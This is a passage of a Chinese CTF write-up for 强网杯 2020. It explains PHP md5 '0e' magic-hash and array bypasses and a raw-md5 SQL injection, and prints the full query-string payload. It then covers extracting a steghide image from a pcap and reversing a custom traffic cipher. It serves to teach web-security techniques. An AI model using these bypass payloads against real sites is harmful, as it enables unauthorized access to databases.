            <span class=k>print</span> <span class=p>(</span><span class=s2>&#34;[+] found! md4( {} ) ---&gt; {}&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>hashed_s</span><span class=p>))</span>
            <span class=k>print</span> <span class=p>(</span><span class=s2>&#34;[+] in {} iterations&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>iters</span><span class=p>))</span>
            <span class=nb>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>

<span class=n>breakit</span><span class=p>()</span>
</code></pre></td></tr></table></div></div><p>大佬的脚本就是从 1 开始，依次 +1，然后加上前缀 <code>0e</code> 进行爆破。这样的方式其实并不算完美，会漏掉一些字符串，例如<code>01</code>。不过这道题的确是得这样做，在跑了 10 多分钟之后，就找到结果了：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/d41cc5121bdf03e3873442896dd98d2ab8b081334e5e6702da5ebf055454dee8.png title=image-20200823201411637 data-thumbnail=/images/强网杯2020部分WriteUp/d41cc5121bdf03e3873442896dd98d2ab8b081334e5e6702da5ebf055454dee8.png data-sub-html="<h2> </h2><p>image-20200823201411637</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/d41cc5121bdf03e3873442896dd98d2ab8b081334e5e6702da5ebf055454dee8.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/d41cc5121bdf03e3873442896dd98d2ab8b081334e5e6702da5ebf055454dee8.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/d41cc5121bdf03e3873442896dd98d2ab8b081334e5e6702da5ebf055454dee8.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/d41cc5121bdf03e3873442896dd98d2ab8b081334e5e6702da5ebf055454dee8.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/d41cc5121bdf03e3873442896dd98d2ab8b081334e5e6702da5ebf055454dee8.png></a><figcaption class=image-caption></figcaption></figure></p><p>接着再来看<code>level 2</code>，在<code>level 2</code>，没有使用到<code>==</code>与<code>!=</code>，所以无法利用上面的方式进行绕过，在这里网上搜索了资料，得知 PHP 的<code>md5()</code>无法处理数组，当构造<code>hash2[]=1&hash3[]=2</code>，即可绕过这里的判断。</p><p>最后来看<code>level 3</code>，这里是我第一眼看到题目时觉得最难的地方，前面两个都是进行有目的的哈希碰撞，这里完全没有目标，所以这里我没有做出来，最后问了大佬，大佬提醒我说 PHP 的 <code>md5()</code>函数第二个参数为<code>true</code>时，会产生漏洞。我拿着这信息去搜索了下，找到了相关的信息，大概就是当 <code>md5()</code>函数第二个参数为<code>true</code>时，该函数返回的是哈希值的<code>16字符的二进制格式</code>，如下：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/b7798c1f887aa0833cb31a825f96f66df61cb473898442452c83b71a43d8c931.png title=image-20200823192324995 data-thumbnail=/images/强网杯2020部分WriteUp/b7798c1f887aa0833cb31a825f96f66df61cb473898442452c83b71a43d8c931.png data-sub-html="<h2> </h2><p>image-20200823192324995</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/b7798c1f887aa0833cb31a825f96f66df61cb473898442452c83b71a43d8c931.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/b7798c1f887aa0833cb31a825f96f66df61cb473898442452c83b71a43d8c931.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/b7798c1f887aa0833cb31a825f96f66df61cb473898442452c83b71a43d8c931.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/b7798c1f887aa0833cb31a825f96f66df61cb473898442452c83b71a43d8c931.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/b7798c1f887aa0833cb31a825f96f66df61cb473898442452c83b71a43d8c931.png></a><figcaption class=image-caption></figcaption></figure></p><p>第一处，是<code>md5('b',false)</code>的结果，这里返回的就是 32 字节的<code>ascii</code>形式的哈希值，而第二处，是<code>md5('b',true)</code>的结果，可以看到前面几个字节与第一处是一样的，相当于是第一处的二进制格式。在第二处的右边可以看到，这几个二进制数据，转化为<code>ascii</code>码之后，变成了<code>'or'xxx</code>，如果将这几个字符与页面上的<code>SQL语句</code>拼接的话，就形成了下面的语句：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php>$query = &#34;SELECT * FROM flag WHERE password = &#39;&#34; . &#34;&#39;or&#39;xxx&#34; . &#34;&#39;&#34;;
</code></pre></td></tr></table></div></div><p>而在<code>MySQL</code>中，<code>or</code>后面只要不为0，即为真，所以这里相当于造成了<code>SQL注入</code>，于是就满足了查询条件，得到了<code>flag</code>，如下：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/5478ff47c5c241e9a8416c8522251354ecf46d628110643c04ed61f2d5328278.png title=image-20200823185538378 data-thumbnail=/images/强网杯2020部分WriteUp/5478ff47c5c241e9a8416c8522251354ecf46d628110643c04ed61f2d5328278.png data-sub-html="<h2> </h2><p>image-20200823185538378</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/5478ff47c5c241e9a8416c8522251354ecf46d628110643c04ed61f2d5328278.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/5478ff47c5c241e9a8416c8522251354ecf46d628110643c04ed61f2d5328278.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/5478ff47c5c241e9a8416c8522251354ecf46d628110643c04ed61f2d5328278.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/5478ff47c5c241e9a8416c8522251354ecf46d628110643c04ed61f2d5328278.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/5478ff47c5c241e9a8416c8522251354ecf46d628110643c04ed61f2d5328278.png></a><figcaption class=image-caption></figcaption></figure></p><p>Payload：<code>?hash1=0e251288019&hash2[]=1&hash3[]=2&hash4=ffifdyop</code></p><p>参考链接：</p><p><a href=https://blog.csdn.net/zz_Caleb/article/details/84947371>https://blog.csdn.net/zz_Caleb/article/details/84947371</a></p><p><a href=https://www.cnblogs.com/piaomiaohongchen/p/10659359.html>https://www.cnblogs.com/piaomiaohongchen/p/10659359.html</a></p><hr><h2 id=强网先锋upload>强网先锋——upload</h2><p>下载题目附件，可看到是一个数据包<code>data.pcapng</code>，用<code>Wireshark</code>打开，可看到都是<code>HTTP</code>的数据：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/3da4763c57d05b6eb4a05ac5b51d79dee43e69e359f438f697b04507874c44b1.png title=image-20200823171355987 data-thumbnail=/images/强网杯2020部分WriteUp/3da4763c57d05b6eb4a05ac5b51d79dee43e69e359f438f697b04507874c44b1.png data-sub-html="<h2> </h2><p>image-20200823171355987</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/3da4763c57d05b6eb4a05ac5b51d79dee43e69e359f438f697b04507874c44b1.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/3da4763c57d05b6eb4a05ac5b51d79dee43e69e359f438f697b04507874c44b1.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/3da4763c57d05b6eb4a05ac5b51d79dee43e69e359f438f697b04507874c44b1.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/3da4763c57d05b6eb4a05ac5b51d79dee43e69e359f438f697b04507874c44b1.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/3da4763c57d05b6eb4a05ac5b51d79dee43e69e359f438f697b04507874c44b1.png></a><figcaption class=image-caption></figcaption></figure></p><p>右键<code>追踪流 ==> TCP流</code>，在第 2 个流中，可看到上传了一张名为<code>steghide.jpg</code>的图片，如下：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/bcbb9ef15999b92a75016221e83648605e70909dcb6a2912ec8164748bd84d86.png title=image-20200823171328459 data-thumbnail=/images/强网杯2020部分WriteUp/bcbb9ef15999b92a75016221e83648605e70909dcb6a2912ec8164748bd84d86.png data-sub-html="<h2> </h2><p>image-20200823171328459</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/bcbb9ef15999b92a75016221e83648605e70909dcb6a2912ec8164748bd84d86.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/bcbb9ef15999b92a75016221e83648605e70909dcb6a2912ec8164748bd84d86.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/bcbb9ef15999b92a75016221e83648605e70909dcb6a2912ec8164748bd84d86.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/bcbb9ef15999b92a75016221e83648605e70909dcb6a2912ec8164748bd84d86.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/bcbb9ef15999b92a75016221e83648605e70909dcb6a2912ec8164748bd84d86.png></a><figcaption class=image-caption></figcaption></figure></p><p>将图片数据提取出来，保存成图片文件，如下：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/08d5fb77fcf2cd79a4adb42a4a34dee543e8e595e65df35663c3d831dfc85796.png title=image-20200823172650758 data-thumbnail=/images/强网杯2020部分WriteUp/08d5fb77fcf2cd79a4adb42a4a34dee543e8e595e65df35663c3d831dfc85796.png data-sub-html="<h2> </h2><p>image-20200823172650758</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/08d5fb77fcf2cd79a4adb42a4a34dee543e8e595e65df35663c3d831dfc85796.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/08d5fb77fcf2cd79a4adb42a4a34dee543e8e595e65df35663c3d831dfc85796.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/08d5fb77fcf2cd79a4adb42a4a34dee543e8e595e65df35663c3d831dfc85796.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/08d5fb77fcf2cd79a4adb42a4a34dee543e8e595e65df35663c3d831dfc85796.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/08d5fb77fcf2cd79a4adb42a4a34dee543e8e595e65df35663c3d831dfc85796.png></a><figcaption class=image-caption></figcaption></figure></p><p>从上传的数据包里可看见，上传的文件名为<code>steghide.jpg</code>，猜测与隐写工具<code>steghide</code>有关，于是用<code>steghide</code>查看一下文件信息：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/d3fcb66265bf386e76f1212c322b8c627f41aabcea5b92e67e621bf7713c1822.png title=image-20200823173123927 data-thumbnail=/images/强网杯2020部分WriteUp/d3fcb66265bf386e76f1212c322b8c627f41aabcea5b92e67e621bf7713c1822.png data-sub-html="<h2> </h2><p>image-20200823173123927</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/d3fcb66265bf386e76f1212c322b8c627f41aabcea5b92e67e621bf7713c1822.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/d3fcb66265bf386e76f1212c322b8c627f41aabcea5b92e67e621bf7713c1822.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/d3fcb66265bf386e76f1212c322b8c627f41aabcea5b92e67e621bf7713c1822.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/d3fcb66265bf386e76f1212c322b8c627f41aabcea5b92e67e621bf7713c1822.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/d3fcb66265bf386e76f1212c322b8c627f41aabcea5b92e67e621bf7713c1822.png></a><figcaption class=image-caption></figcaption></figure></p><p>发现有密码，随手一测<code>123456</code>，发现密码正确：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/5742d4779c34fb117900b8f962d3719835eee8d62ee064062003c35693a4f14e.png title=image-20200823173238110 data-thumbnail=/images/强网杯2020部分WriteUp/5742d4779c34fb117900b8f962d3719835eee8d62ee064062003c35693a4f14e.png data-sub-html="<h2> </h2><p>image-20200823173238110</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/5742d4779c34fb117900b8f962d3719835eee8d62ee064062003c35693a4f14e.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/5742d4779c34fb117900b8f962d3719835eee8d62ee064062003c35693a4f14e.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/5742d4779c34fb117900b8f962d3719835eee8d62ee064062003c35693a4f14e.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/5742d4779c34fb117900b8f962d3719835eee8d62ee064062003c35693a4f14e.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/5742d4779c34fb117900b8f962d3719835eee8d62ee064062003c35693a4f14e.png></a><figcaption class=image-caption></figcaption></figure></p><p>于是提取<code>flag.txt</code>，得到<code>flag</code>：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/4659f12b00e40c1d884229f31c2e65275782d0486aaaa70a3fe644bcbb587749.png title=image-20200823173322237 data-thumbnail=/images/强网杯2020部分WriteUp/4659f12b00e40c1d884229f31c2e65275782d0486aaaa70a3fe644bcbb587749.png data-sub-html="<h2> </h2><p>image-20200823173322237</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/4659f12b00e40c1d884229f31c2e65275782d0486aaaa70a3fe644bcbb587749.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/4659f12b00e40c1d884229f31c2e65275782d0486aaaa70a3fe644bcbb587749.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/4659f12b00e40c1d884229f31c2e65275782d0486aaaa70a3fe644bcbb587749.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/4659f12b00e40c1d884229f31c2e65275782d0486aaaa70a3fe644bcbb587749.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/4659f12b00e40c1d884229f31c2e65275782d0486aaaa70a3fe644bcbb587749.png></a><figcaption class=image-caption></figcaption></figure></p><p>参考链接：http://www.safe6.cn/article/102</p><hr><h2 id=强网先锋红方辅助>强网先锋——红方辅助</h2><p>下载附件，得到两个文件<code>client.py</code>、<code>enc.pcapng</code></p><p>先来看<code>client.py</code>，该脚本就是读取文件并且加密后发送给服务器，主要逻辑如下：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/c4e499de2d6a68834c0775916c3bc86fc2a0ad4bf67730cb0375375ed3b4c2d0.png title=image-20200824022220030 data-thumbnail=/images/强网杯2020部分WriteUp/c4e499de2d6a68834c0775916c3bc86fc2a0ad4bf67730cb0375375ed3b4c2d0.png data-sub-html="<h2> </h2><p>image-20200824022220030</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/c4e499de2d6a68834c0775916c3bc86fc2a0ad4bf67730cb0375375ed3b4c2d0.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/c4e499de2d6a68834c0775916c3bc86fc2a0ad4bf67730cb0375375ed3b4c2d0.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/c4e499de2d6a68834c0775916c3bc86fc2a0ad4bf67730cb0375375ed3b4c2d0.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/c4e499de2d6a68834c0775916c3bc86fc2a0ad4bf67730cb0375375ed3b4c2d0.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/c4e499de2d6a68834c0775916c3bc86fc2a0ad4bf67730cb0375375ed3b4c2d0.png></a><figcaption class=image-caption></figcaption></figure></p><ul><li>打开文件并读取每一行数据</li><li>发送<code>G</code>到服务端</li><li>接收 4 字节服务端发来的数据</li><li>将每一行数据、接收到的 4 字节数据、计数变量一起传递给加密函数，得到两个值，<code>data</code>为加密后的数据</li><li>将刚才得到的数据发送给服务端</li><li>获取 4 字节服务端发来的数据，并与计数变量进行比较</li></ul><p>从上面的流程可以看到，与服务端交互的过程是<code>发送 ==> 接收 ==> 发送 ==> 发送 ==> 接收</code></p><p>现在再来看<code>enc.pcapng</code>，打开之后右键选择<code>追踪流 ==> TCP流</code>，在第 2 个流中可看到大量加密后的数据，如下：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/ede59afb8b018185256b4073497adee1f572144ed6de4bd6c2ee6e24f5565c19.png title=image-20200824022849106 data-thumbnail=/images/强网杯2020部分WriteUp/ede59afb8b018185256b4073497adee1f572144ed6de4bd6c2ee6e24f5565c19.png data-sub-html="<h2> </h2><p>image-20200824022849106</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/ede59afb8b018185256b4073497adee1f572144ed6de4bd6c2ee6e24f5565c19.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/ede59afb8b018185256b4073497adee1f572144ed6de4bd6c2ee6e24f5565c19.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/ede59afb8b018185256b4073497adee1f572144ed6de4bd6c2ee6e24f5565c19.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/ede59afb8b018185256b4073497adee1f572144ed6de4bd6c2ee6e24f5565c19.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/ede59afb8b018185256b4073497adee1f572144ed6de4bd6c2ee6e24f5565c19.png></a><figcaption class=image-caption></figcaption></figure></p><p>可以看到其中有很多<code>G</code>，可以判断这就是发送的数据包，在这里我们将流显示为<code>原始数据</code>，看得更清晰：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/930ef3346ab7d97bed618ef75d43a8687b1dc3da5bbffd4bd4b7de1ca1fd625c.png title=image-20200824023035570 data-thumbnail=/images/强网杯2020部分WriteUp/930ef3346ab7d97bed618ef75d43a8687b1dc3da5bbffd4bd4b7de1ca1fd625c.png data-sub-html="<h2> </h2><p>image-20200824023035570</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/930ef3346ab7d97bed618ef75d43a8687b1dc3da5bbffd4bd4b7de1ca1fd625c.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/930ef3346ab7d97bed618ef75d43a8687b1dc3da5bbffd4bd4b7de1ca1fd625c.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/930ef3346ab7d97bed618ef75d43a8687b1dc3da5bbffd4bd4b7de1ca1fd625c.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/930ef3346ab7d97bed618ef75d43a8687b1dc3da5bbffd4bd4b7de1ca1fd625c.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/930ef3346ab7d97bed618ef75d43a8687b1dc3da5bbffd4bd4b7de1ca1fd625c.png></a><figcaption class=image-caption></figcaption></figure></p><p>可以很清晰地看出，这就是每一次发送接收的数据流，与之前分析的过程一模一样，都是<code>发送 ==> 接收 ==> 发送 ==> 发送 ==> 接收</code>：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/ff497804c66a6c62f6ba6dfbff3e60edf595b6c94bd10f7d50af40a847888908.png title=image-20200824023322550 data-thumbnail=/images/强网杯2020部分WriteUp/ff497804c66a6c62f6ba6dfbff3e60edf595b6c94bd10f7d50af40a847888908.png data-sub-html="<h2> </h2><p>image-20200824023322550</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/ff497804c66a6c62f6ba6dfbff3e60edf595b6c94bd10f7d50af40a847888908.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/ff497804c66a6c62f6ba6dfbff3e60edf595b6c94bd10f7d50af40a847888908.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/ff497804c66a6c62f6ba6dfbff3e60edf595b6c94bd10f7d50af40a847888908.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/ff497804c66a6c62f6ba6dfbff3e60edf595b6c94bd10f7d50af40a847888908.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/ff497804c66a6c62f6ba6dfbff3e60edf595b6c94bd10f7d50af40a847888908.png></a><figcaption class=image-caption></figcaption></figure></p><p>经过分析，服务端发送来的数据<code>btime</code>为时间戳，而<code>pcount</code>则是和计数变量一致的内容</p><p>接下来再来分析加密函数，如下：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/82906db1875a01a8cb9f08ba06c0312645307e910609878358ae98996e31b937.png title=image-20200824023602505 data-thumbnail=/images/强网杯2020部分WriteUp/82906db1875a01a8cb9f08ba06c0312645307e910609878358ae98996e31b937.png data-sub-html="<h2> </h2><p>image-20200824023602505</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/82906db1875a01a8cb9f08ba06c0312645307e910609878358ae98996e31b937.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/82906db1875a01a8cb9f08ba06c0312645307e910609878358ae98996e31b937.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/82906db1875a01a8cb9f08ba06c0312645307e910609878358ae98996e31b937.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/82906db1875a01a8cb9f08ba06c0312645307e910609878358ae98996e31b937.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/82906db1875a01a8cb9f08ba06c0312645307e910609878358ae98996e31b937.png></a><figcaption class=image-caption></figcaption></figure></p><p>其中返回的<code>boffset</code>是<code>offset</code>变量中的其中一个，这个通过观察流量包也能看出来，永远都是三个之中的一个。</p><p><code>enc</code>则是将一堆算出来的值，合在一起的东西。</p><p>在这个题中，我们主要是要知道它传输的内容到底是什么，也就是加密函数的形参<code>data</code>，而在加密函数的 37 行这里，将<code>data</code>一个一个取出来，进行一顿异或和模之后，得到的结果给<code>enc</code>并传送给服务端。也就是说现在我们手上有加密的数据，加密的算法，现在需要写出解密算法，来将加密数据给解密出来。</p><p>首先来看加密函数的 35 行，这里是<code>enc</code>首次被打包赋值，这几个值是解密的关键，而且这几个值没有被加密，可以从数据中得到。先来看看这个打包的格式<code>&lt;IIcB</code>，<code>&lt;</code>代表用小端存储，<code>I</code>代表<code>int</code>型，占 4 字节，<code>c</code>代表<code>char</code>型，占 1 字节，<code>B</code>代表<code>unsigned char</code>，占 1 字节。而在第一次的数据包中就对应如下这几个字节：</p><p><figure><a class=lightgallery href=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/c6b050a08c9fc79024f251be436ea08aea238252cbcb0413cd1197db43eed3f2.png title=image-20200824024653953 data-thumbnail=/images/强网杯2020部分WriteUp/c6b050a08c9fc79024f251be436ea08aea238252cbcb0413cd1197db43eed3f2.png data-sub-html="<h2> </h2><p>image-20200824024653953</p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/c6b050a08c9fc79024f251be436ea08aea238252cbcb0413cd1197db43eed3f2.png data-srcset="/images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/c6b050a08c9fc79024f251be436ea08aea238252cbcb0413cd1197db43eed3f2.png, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/c6b050a08c9fc79024f251be436ea08aea238252cbcb0413cd1197db43eed3f2.png 1.5x, /images/%e5%bc%ba%e7%bd%91%e6%9d%af2020%e9%83%a8%e5%88%86WriteUp/c6b050a08c9fc79024f251be436ea08aea238252cbcb0413cd1197db43eed3f2.png 2x" data-sizes=auto alt=/images/强网杯2020部分WriteUp/c6b050a08c9fc79024f251be436ea08aea238252cbcb0413cd1197db43eed3f2.png></a><figcaption class=image-caption></figcaption></figure></p><p>转换回来的话就是：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=n>enc</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s2>&#34;&lt;IIcB&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>132</span><span class=p>,</span> <span class=s1>&#39;0&#39;</span><span class=p>,</span> <span class=mi>14</span><span class=p>)</span>
</code></pre></td></tr></table></div></div><p>而下面的加密循环就变成了这样：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>i = 0 
for c in data:
    enc += chr((funcs[&#39;0&#39;.decode()](ord(c) ^ ord(t[i]), 14) % 256))
    i = (i + 1) % 4
</code></pre></td></tr></table></div></div><p>其中的<code>t</code>也是能从数据包中找到的，所以最后就只剩<code>c</code>不知道，也就是<code>data</code>的每一个字符不知道是啥。</p><p>求<code>c</code>怎么求呢，因为加密数据包已经知道了，所以它每次加密后的结果是知道的，例如第一个是<code>a4</code>，那么<code>chr((funcs['0'.decode()](ord(c) ^ ord(t[i]), 14) % 256)) = 0xa4</code>，在这种表达式下，<code>c</code>的值肯定是<code>0 ~ 255</code>之间的一个值，为什么呢，因为它是<code>data</code>中的字符啊，而<code>data</code>是可以显示的字符串，所以它的每一个字符都是可显示的，那么就肯定是<code>0 ~ 255</code>的值，这时就可以进行枚举<code>c</code>，从<code>0 ~255</code>中枚举，哪一个满足这个表达式那么<code>c</code>就为那个。</p><p>有了上面的思路，就可以写脚本了，先将数据包里的原始数据保存成<code>data.txt</code>，然后运行脚本：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
